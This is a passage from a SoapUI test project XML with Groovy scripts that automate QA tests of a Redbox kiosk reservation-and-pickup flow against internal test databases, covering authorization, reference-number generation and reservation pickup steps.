testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1982825</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149057937</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value>&lt;CPCUSTOMERNUMBER/></con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Return PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>14</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>12/26/18-11:38:18.742</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>12/26/18-11:40:07.774</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>13</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="0ebe3399-8459-47a0-9ead-78c032df28ea" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="ROP" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="edbe8f26-f9df-43cf-9d38-c1e3934cd7d4"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="5adc91fc-5306-4fa3-82f2-82c476349742"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="JDBC"><con:configuration><driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</driver><connstr>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</connstr><pass>t</pass><Connection>QaAutomation( QAInt )</Connection><query>Select KS_ROP.ID As ID, KS_ROP.Scenario As Scenario, KS_ROP.Email As Email,
  KS_ROP.CreditCardNumber As Ccnumber, KS_ROP.CreditCardType As CCType,
  KS_ROP.PromoCode As PromoCode, KS_ROP.PromoValue As PromoValue, KS_ROP.KioskID
  As KioskID, KS_ROP.RentalFormats As rentalFormats, KS_ROP.NumberOfRentals As
  numOfRentals, KS_ROP.RentalVendStatus As RentalVendStatus,
  KS_ROP.PurchaseFormats As PurchaseFormats, KS_ROP.NumberOfPurchases As
  numOfPurchases, KS_ROP.PurchaseVendStatus As PurchaseVendStatus,
  KS_ROP.SetDaysBack As SetDaysBack, KS_ROP.RecoFormats As recoFormats,
  KS_ROP.NumOfRecos As numOfRecos, KS_ROP.RecoVendStatus As RecoVendStatus
From KS_ROP
Where KS_ROP.TestCaseName = 'CC-ROP'</query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>ID</con:property><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>recoFormats</con:property><con:property>numOfRecos</con:property><con:property>RecoVendStatus</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="cffdeb23-c9ff-4748-95b4-242e4b691502"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("----------------------------------" + context.testCase.name + "---------------------------------");
log.info ("Scenario [$ScenarioNo]: " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="19fd1a13-3548-4d4a-a23d-223b4be50cae"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
//tc.setPropertyValue("recoFormats", context.expand( '${DataSource#recoFormats}' ));
//tc.setPropertyValue("numOfRecos", context.expand( '${DataSource#numOfRecos}' ));
//tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#recoFormats}' ));
tc.setPropertyValue("LoyaltyFlag", '');//Harcoded to empty - No ROP flow when Loyalty points are used for reservation. 
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", 'false');//HardCoded to false since it Reservation
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");
tc.setPropertyValue("HasOffer", "false");
tc.setPropertyValue("MDVFlag", '');
tc.setPropertyValue("MDVDiscNumber",'');

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="GenerateReferenceNumber" id="b06b9d55-cb5c-4154-8460-1e578666af79"><con:settings/><con:config><script>//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def qaConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('QaAutomation');
def rbconstring = rbConObj.getConnectionString();
def qaconstring = qaConObj.getConnectionString();
//Define the Connection
def rbsql = Sql.newInstance(rbconstring);
def qasql = Sql.newInstance(qaconstring);

//Generate new sequenceNumber
def generateSequenceNumber = rbsql.call("exec [dbo].[rb_GetNextReferenceNumber]");

//Get SequenceNumber
def getSequenceNumber = qasql.firstRow("Select ReferenceNumber from QA_ReferenceNumber");
def ReferenceNumber = getSequenceNumber.ReferenceNumber.toString();
log.info ("ReferenceNumber:$ReferenceNumber");
testRunner.testCase.setPropertyValue("ReferenceNumber",ReferenceNumber.toString())

//Build SQL Query to Insert
//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
def TransactionID = authtc.getPropertyValue("TransactionID")
def BarcodeForTnx = authtc.getPropertyValue("BarcodeForTnx");
def tnxDetails = rbsql.firstRow("Select ProcessorTran_ID,ApprovalCode,Rent_Date as RentDate,KioskClient_ID,ProcessorDeclinedCode,Add_Verification_Res,RentalTaxRate,AuthAmount,Customer_ID,InvoiceID,GetDate() As DateTime From [Transaction] Where Transaction_ID = $TransactionID");
def ProcessorTranID = tnxDetails.ProcessorTran_ID.toString();
def ApprovalCode = tnxDetails.ApprovalCode.toString();
def KioskID = tnxDetails.KioskClient_ID.toString();
def ProcessorDeclinedCode = tnxDetails.ProcessorDeclinedCode.toString();
def AVSResponseCode = tnxDetails.Add_Verification_Res.toString();
def SalesTaxRate = tnxDetails.RentalTaxRate.toString();
def AuthAmount = tnxDetails.AuthAmount.toString();
def CustomerID = tnxDetails.Customer_ID.toString();
def InvoiceID = tnxDetails.InvoiceID.toString();
def LastDateTime = tnxDetails.DateTime.toString();
def RentDate = tnxDetails.RentDate.toString();
def Email = context.expand( '${DataSource#Email}' );

def getWebAccountInfo = rbsql.firstRow("Select WebAccountID from WebAccount Where EmailAddress = '$Email'");
def WebAccountID = getWebAccountInfo.WebAccountID.toString();

log.info ("Barcode: $BarcodeForTnx; TransactionID:$TransactionID")
log.info ("ProcessorTranID:$ProcessorTranID;ApprovalCode:$ApprovalCode;KioskID:$KioskID;ProcessorDeclinedCode:$ProcessorDeclinedCode;AVSResponseCode:$AVSResponseCode;SalesTaxRate:$SalesTaxRate;AuthAmount:$AuthAmount;CustomerID:$CustomerID;InvoiceID:$InvoiceID;LastDateTime:$LastDateTime;WebAccountID:$WebAccountID")

//Build sql Query to insert into reservation table.
sqlQuery = ""
sqlQuery += "INSERT INTO [dbo].[Reservation]"
sqlQuery += "\n"
sqlQuery += "([CardID]"
sqlQuery += "\n"
sqlQuery += ",[KioskID]"
sqlQuery += "\n"
sqlQuery += ",[BarCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorTranID]"
sqlQuery += "\n"
sqlQuery += ",[ReferenceNumber]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorLogID]"
sqlQuery += "\n"
sqlQuery += ",[ApprovalCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorDeclinedCode]"
sqlQuery += "\n"
sqlQuery += ",[AVSResponseCode]"
sqlQuery += "\n"
sqlQuery += ",[Email_Address]"
sqlQuery += "\n"
sqlQuery += ",[DateCreated]"
sqlQuery += "\n"
sqlQuery += ",[StatusCode]"
sqlQuery += "\n"
sqlQuery += ",[FailureCode]"
sqlQuery += "\n"
sqlQuery += ",[RentedDate]"
sqlQuery += "\n"
sqlQuery += ",[SalesTaxRate]"
sqlQuery += "\n"
sqlQuery += ",[AuthAmount]"
sqlQuery += "\n"
sqlQuery += ",[LastUpdate]"
sqlQuery += "\n"
sqlQuery += ",[CustomerID]"
sqlQuery += "\n"
sqlQuery += ",[InvoiceID]"
sqlQuery += "\n"
sqlQuery += ",[Mobile]"
sqlQuery += "\n"
sqlQuery += ",[UserAgent]"
sqlQuery += "\n"
sqlQuery += ",[WebAccountID]"
sqlQuery += "\n"
sqlQuery += ",[ClientIP]"
sqlQuery += "\n"
sqlQuery += ",[OmnitureSuiteId]"
sqlQuery += "\n"
sqlQuery += ",[RedboxDeviceIdentifier])"
sqlQuery += "\n"
sqlQuery += "VALUES"
sqlQuery += "\n"
sqlQuery += "(NULL"
sqlQuery += "\n"
sqlQuery += ",\'$KioskID\'"
sqlQuery += "\n"
sqlQuery += ",\'$BarcodeForTnx\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorTranID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ReferenceNumber\'"
sqlQuery += "\n"
sqlQuery += ",\'$TransactionID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ApprovalCode\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorDeclinedCode\'"
sqlQuery += "\n"
sqlQuery += ",\'I4\'"
sqlQuery += "\n"
sqlQuery += ",\'$Email\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",1"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'$RentDate\'"
sqlQuery += "\n"
sqlQuery += ",\'$SalesTaxRate\'"
sqlQuery += "\n"
sqlQuery += ",\'$AuthAmount\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",\'$CustomerID\'"
sqlQuery += "\n"
sqlQuery += ",\'$InvoiceID\'"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'SoapUI-Automation\'"
sqlQuery += "\n"
sqlQuery += ",\'$WebAccountID\'"
sqlQuery += "\n"
sqlQuery += ",\'10.30.7.238\'"
sqlQuery += "\n"
sqlQuery += ",3"
sqlQuery += "\n"
sqlQuery += ",NULL"
sqlQuery += "\n"
sqlQuery += ")"

def insertReservation = rbsql.execute(sqlQuery);

def updateTransaction = rbsql.execute("Update [Transaction] Set RentalType = 3 Where Transaction_ID = $TransactionID");</script></con:config></con:testStep><con:testStep type="groovy" name="ResvAuth" id="f8e37a9f-a85c-4b06-b249-11958c3f2b11"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ResvAuth"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
//tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));
tc.setPropertyValue("recoFormats", context.expand( '${DataSource#recoFormats}' ));
tc.setPropertyValue("numOfRecos", context.expand( '${DataSource#numOfRecos}' ));
tc.setPropertyValue('ModifiedCart', 'true');

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("Email", authtc.getPropertyValue("Email"));
tc.setPropertyValue("KioskID", authtc.getPropertyValue("KioskID"));
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("AppliedPromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
//MDV
tc.setPropertyValue("RentalMDVFlag", authtc.getPropertyValue("RentalMDVFlag"));
tc.setPropertyValue("RentalMDVDiscNumber", authtc.getPropertyValue("RentalMDVDiscNumber"));
tc.setPropertyValue("PurchaseMDVFlag", authtc.getPropertyValue("PurchaseMDVFlag"));
tc.setPropertyValue("PurchaseMDVDiscNumber", authtc.getPropertyValue("PurchaseMDVDiscNumber"));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [ResvAuth] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ResvAuth $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ResvAuth $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="ModResvPickup" id="ddfa72d1-ab27-4a1c-be43-2ec85c37438e"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );

//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ModResvPickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("UseCredits", '0');

tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RecoVendStatus}' ) + "," + context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ResvAuth"];
tc.setPropertyValue("Email", authtc.getPropertyValue("Email"));
tc.setPropertyValue("KioskID", authtc.getPropertyValue("KioskID"));
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("ItemSourceType", authtc.getPropertyValue("ItemSourceType"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
